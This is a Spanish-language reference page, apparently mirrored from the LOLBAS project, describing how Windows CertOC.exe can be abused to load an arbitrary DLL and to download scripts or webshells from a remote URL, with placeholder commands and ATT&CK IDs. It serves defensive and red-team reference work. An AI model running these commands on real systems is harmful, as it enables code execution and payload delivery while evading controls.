# LOLBAS: CertOC.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Download`, `Execute`

Used for installing certificates

## Comandos

### Execute code within DLL file

Execute · priv: User · T1218

```cmd
certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll}
```

Loads the target DLL file

### Download scripts, webshells etc.

Download · priv: User · T1105

```cmd
certoc.exe -GetCACAPS {REMOTEURL:.ps1}
```

Downloads text formatted files

